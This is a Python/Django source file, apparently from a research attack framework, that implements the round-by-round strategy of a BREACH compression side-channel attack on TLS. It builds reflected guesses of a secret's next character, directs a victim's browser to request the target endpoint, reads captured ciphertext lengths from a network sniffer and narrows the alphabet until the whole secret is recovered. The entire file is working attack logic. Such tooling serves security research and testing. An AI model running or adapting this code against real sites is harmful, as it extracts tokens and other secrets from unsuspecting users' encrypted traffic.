from django.utils import timezone
from django.db.models import Max
from django.core.exceptions import ValidationError

from breach.analyzer import decide_next_world_state
from breach.models import SampleSet, Round, Target
from breach.sniffer import Sniffer

import string
import requests
import logging
import random


logger = logging.getLogger(__name__)


class MaxReflectionLengthError(Exception):
    '''Custom exception to handle cases when maxreflectionlength
    is not sufficient for the attack to continue.'''
    pass


class Strategy(object):
    def __init__(self, victim):
        self._victim = victim
        self._sniffer = Sniffer(
            victim.snifferendpoint,
            self._victim.sourceip,
            self._victim.target.host,
            self._victim.interface,
            self._victim.target.port
        )

        # Extract maximum round index for the current victim.
        current_round_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max']

        if not current_round_index:
            current_round_index = 1
            self._analyzed = True
            try:
                self._begin_attack()
            except MaxReflectionLengthError:
                # If the initial round or samplesets cannot be created, end the analysis
                return

        self._round = Round.objects.filter(
            victim=self._victim,
            index=current_round_index
        )[0]
        self._analyzed = False

    def _build_candidates_divide_conquer(self, state):
        candidate_alphabet_cardinality = len(state['knownalphabet']) / 2

        bottom_half = state['knownalphabet'][:candidate_alphabet_cardinality]
        top_half = state['knownalphabet'][candidate_alphabet_cardinality:]

        return [bottom_half, top_half]

    def _build_candidates_serial(self, state):
        return state['knownalphabet']

    def _build_candidates(self, state):
        '''Given a state of the world, produce a list of candidate alphabets.'''
        methods = {
            Target.SERIAL: self._build_candidates_serial,
            Target.DIVIDE_CONQUER: self._build_candidates_divide_conquer
        }
        return methods[self._round.get_method()](state)

    def _get_first_round_state(self):
        return {
            'knownsecret': self._victim.target.prefix,
            'candidatealphabet': self._victim.target.alphabet,
            'knownalphabet': self._victim.target.alphabet
        }

    def _get_unstarted_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            started=None
        )

    def _reflection(self, alphabet):
        # We use '^' as a separator symbol and we assume it is not part of the
        # secret. We also assume it will not be in the content.

        # Added symbols are the total amount of dummy symbols that need to be added,
        # either in candidate alphabet or huffman complement set in order
        # to avoid huffman tree imbalance between samplesets of the same batch.
        added_symbols = self._round.maxroundcardinality - self._round.minroundcardinality

        sentinel = '^'

        assert(sentinel not in self._round.knownalphabet)
        knownalphabet_complement = list(set(string.ascii_letters + string.digits) - set(self._round.knownalphabet))

        candidate_secrets = set()
        for letter in alphabet:
            candidate_secret = self._round.knownsecret + letter
            candidate_secrets.add(candidate_secret)

        # Candidate balance indicates the amount of dummy symbols that will be included with the
        # candidate alphabet's part of the reflection.
        candidate_balance = self._round.maxroundcardinality - len(candidate_secrets)
        assert(len(knownalphabet_complement) > candidate_balance)
        candidate_balance = [self._round.knownsecret + c for c in knownalphabet_complement[0:candidate_balance]]

        reflected_data = [
            '',
            sentinel.join(list(candidate_secrets) + candidate_balance),
            ''
        ]

        if self._round.check_huffman_pool():
            # Huffman complement indicates the knownalphabet symbols that are not currently being tested
            huffman_complement = set(self._round.knownalphabet) - set(alphabet)

            huffman_balance = added_symbols - len(candidate_balance)

            assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)

            huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]
            reflected_data.insert(1, sentinel.join(list(huffman_complement) + huffman_balance))

        reflection = sentinel.join(reflected_data)

        return reflection

    def _url(self, alphabet):
        return self._victim.target.endpoint % self._reflection(alphabet)

    def _sampleset_to_work(self, sampleset):
        return {
            'url': self._url(sampleset.candidatealphabet),
            'amount': self._victim.target.samplesize,
            'alignmentalphabet': sampleset.alignmentalphabet,
            'timeout': 0
        }

    def get_work(self):
        '''Produces work for the victim.

        Pre-condition: There is already work to do.'''

        # If analysis is complete or maxreflectionlength cannot be overcome
        # then execution should abort
        if self._analyzed:
            return {}

        # Reaps a hanging sampleset that may exist from previous framework execution
        # Hanging sampleset condition: backend or realtime crash
        hanging_samplesets = self._get_started_samplesets()
        for s in hanging_samplesets:
            logger.warning('Reaping hanging set for: {}'.format(s.candidatealphabet))
            self._mark_current_work_completed('', s)

        try:
            self._sniffer.start()
        except (requests.HTTPError, requests.exceptions.ConnectionError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to start sniffer.'.format(status_code))

                # If status was raised due to conflict,
                # delete already existing sniffer.
                if status_code == 409:
                    try:
                        self._sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return {}

        unstarted_samplesets = self._get_unstarted_samplesets()

        assert(unstarted_samplesets)

        sampleset = unstarted_samplesets[0]
        sampleset.started = timezone.now()
        sampleset.save()

        work = self._sampleset_to_work(sampleset)

        logger.debug('Giving work:')
        logger.debug('\tCandidate: {}'.format(sampleset.candidatealphabet))

        return work

    def _get_started_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            completed=None
        ).exclude(started=None)

    def _get_current_sampleset(self):
        started_samplesets = self._get_started_samplesets()

        assert(len(started_samplesets) == 1)

        sampleset = started_samplesets[0]

        return sampleset

    def _handle_sampleset_success(self, capture, sampleset):
        '''Save capture of successful sampleset
        or mark sampleset as failed and create new sampleset for the same element that failed.'''
        if capture:
            sampleset.success = True
            sampleset.data = capture
            sampleset.save()
        else:
            s = SampleSet(
                round=sampleset.round,
                candidatealphabet=sampleset.candidatealphabet,
                alignmentalphabet=sampleset.alignmentalphabet
            )
            s.save()

    def _mark_current_work_completed(self, capture=None, sampleset=None):
        if not sampleset:
            sampleset = self._get_current_sampleset()

        sampleset.completed = timezone.now()
        sampleset.save()

        self._handle_sampleset_success(capture, sampleset)

    def _collect_capture(self):
        captured_data = self._sniffer.read()
        return captured_data['capture'], captured_data['records']

    def _analyze_current_round(self):
        '''Analyzes the current round samplesets to extract a decision.'''

        current_round_samplesets = SampleSet.objects.filter(round=self._round, success=True)
        self._decision = decide_next_world_state(current_round_samplesets)

        logger.debug(75 * '#')
        logger.debug('Decision:')
        for i in self._decision:
            logger.debug('\t{}: {}'.format(i, self._decision[i]))
        logger.debug(75 * '#')

        self._analyzed = True

    def _round_is_completed(self):
        '''Checks if current round is completed.'''

        assert(self._analyzed)

        # Do we need to collect more samplesets to build up confidence?
        return self._decision['confidence'] > 1

    def _create_next_round(self):
        assert(self._round_is_completed())

        self._create_round(self._decision['state'])

    def _set_round_cardinalities(self, candidate_alphabets):
        self._round.maxroundcardinality = max(map(len, candidate_alphabets))
        self._round.minroundcardinality = min(map(len, candidate_alphabets))

    def _adapt_reflection_length(self, state):
        '''Check reflection length compared to maxreflectionlength.

        If current reflection length is bigger, downgrade various attack aspects
        until reflection length <= maxreflectionlength.

        If all downgrade attempts fail, raise a MaxReflectionLengthError.

        Condition: Reflection returns strings of same length for all candidates in
        candidate alphabet.'''
        def _build_candidate_alphabets():
            candidate_alphabets = self._build_candidates(state)
            self._set_round_cardinalities(candidate_alphabets)
            return candidate_alphabets

        def _get_first_reflection():
            alphabet = _build_candidate_alphabets()[0]
            return self._reflection(alphabet)

        logger.debug('Checking max reflection length...')

        if self._round.victim.target.maxreflectionlength == 0:
            self._set_round_cardinalities(self._build_candidates(state))
            return

        while len(_get_first_reflection()) > self._round.victim.target.maxreflectionlength:
            if self._round.get_method() == Target.DIVIDE_CONQUER:
                self._round.method = Target.SERIAL
                logger.info('Divide & conquer method cannot be used, falling back to serial.')
            elif self._round.check_huffman_pool():
                self._round.huffman_pool = False
                logger.info('Huffman pool cannot be used, removing it.')
            elif self._round.check_block_align():
                self._round.block_align = False
                logger.info('Block alignment cannot be used, removing it.')
            else:
                raise MaxReflectionLengthError('Cannot attack, specified maxreflectionlength is too short')

    def _create_round(self, state):
        '''Creates a new round based on the analysis of the current round.'''

        assert(self._analyzed)

        # This next round could potentially be the final round.
        # A final round has the complete secret stored in knownsecret.
        next_round = Round(
            victim=self._victim,
            index=self._round.index + 1 if hasattr(self, '_round') else 1,
            amount=self._victim.target.samplesize,
            knownalphabet=state['knownalphabet'],
            knownsecret=state['knownsecret']
        )
        next_round.save()
        self._round = next_round

        try:
            self._adapt_reflection_length(state)
        except MaxReflectionLengthError, err:
            self._round.delete()
            self._analyzed = True
            logger.info(err)
            raise err

        try:
            next_round.clean()
        except ValidationError, err:
            logger.error(err)
            self._round.delete()
            raise err

        logger.debug('Created new round:')
        logger.debug('\tKnown secret: {}'.format(next_round.knownsecret))
        logger.debug('\tKnown alphabet: {}'.format(next_round.knownalphabet))
        logger.debug('\tAmount: {}'.format(next_round.amount))

    def _create_round_samplesets(self):
        state = {
            'knownalphabet': self._round.knownalphabet,
            'knownsecret': self._round.knownsecret
        }

        candidate_alphabets = self._build_candidates(state)

        alignmentalphabet = ''
        if self._round.check_block_align():
            alignmentalphabet = list(self._round.victim.target.alignmentalphabet)
            random.shuffle(alignmentalphabet)
            alignmentalphabet = ''.join(alignmentalphabet)

        logger.debug('\tAlignment alphabet: {}'.format(alignmentalphabet))

        for candidate in candidate_alphabets:
            sampleset = SampleSet(
                round=self._round,
                candidatealphabet=candidate,
                alignmentalphabet=alignmentalphabet
            )
            sampleset.save()

            try:
                sampleset.clean()
            except ValidationError, err:
                logger.error(err)
                sampleset.delete()
                raise err

    def _attack_is_completed(self):
        return len(self._round.knownsecret) == self._victim.target.secretlength

    def work_completed(self, success=True):
        '''Receives and consumes work completed from the victim, analyzes
        the work, and returns True if the attack is complete (victory),
        otherwise returns False if more work is needed.

        It also creates the new work that is needed.

        Post-condition: Either the attack is completed, or there is work to
        do (there are unstarted samplesets in the database).'''
        try:
            if success:
                # Call sniffer to get captured data
                capture, records = self._collect_capture()
                logger.debug('Work completed:')
                logger.debug('\tLength: {}'.format(len(capture)))
                logger.debug('\tRecords: {}'.format(records))

                # Check if all TLS response records were captured,
                # if available
                if self._victim.target.recordscardinality:
                    if records != self._victim.target.samplesize * self._victim.target.recordscardinality:
                        raise ValueError('Not all records captured')
            else:
                logger.debug('Client returned fail to realtime')
                raise ValueError('Realtime reported unsuccessful capture')

            # Stop data collection and delete sniffer
            self._sniffer.delete()
        except (requests.HTTPError, requests.exceptions.ConnectionError, ValueError), err:
            if isinstance(err, requests.HTTPError):
                status_code = err.response.status_code
                logger.warning('Caught {} while trying to collect capture and delete sniffer.'.format(status_code))

                # If status was raised due to malformed capture,
                # delete sniffer to avoid conflict.
                if status_code == 422:
                    try:
                        self._sniffer.delete()
                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            elif isinstance(err, requests.exceptions.ConnectionError):
                logger.warning('Caught ConnectionError')

            elif isinstance(err, ValueError):
                logger.warning(err)
                try:
                    self._sniffer.delete()
                except (requests.HTTPError, requests.exceptions.ConnectionError), err:
                    logger.warning('Caught error when trying to delete sniffer: {}'.format(err))

            # An error occurred, so if there is a started sampleset mark it as failed
            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
                self._mark_current_work_completed()

            return False

        self._mark_current_work_completed(capture)

        round_samplesets = SampleSet.objects.filter(round=self._round)
        unstarted_samplesets = round_samplesets.filter(started=None)

        if unstarted_samplesets:
            # Batch is not yet complete, we need to collect more samplesets
            # that have already been created for this batch.
            return False

        # All batches are completed.
        self._analyze_current_round()

        if self._round_is_completed():
            # Advance to the next round.
            try:
                self._create_next_round()
            except MaxReflectionLengthError:
                # If a new round cannot be created, end the attack
                return True

            if self._attack_is_completed():
                return True

        # Not enough confidence, we need to create more samplesets to be
        # collected for this round.
        self._create_round_samplesets()

        return False

    def _begin_attack(self):
        self._create_round(self._get_first_round_state())
        self._create_round_samplesets()
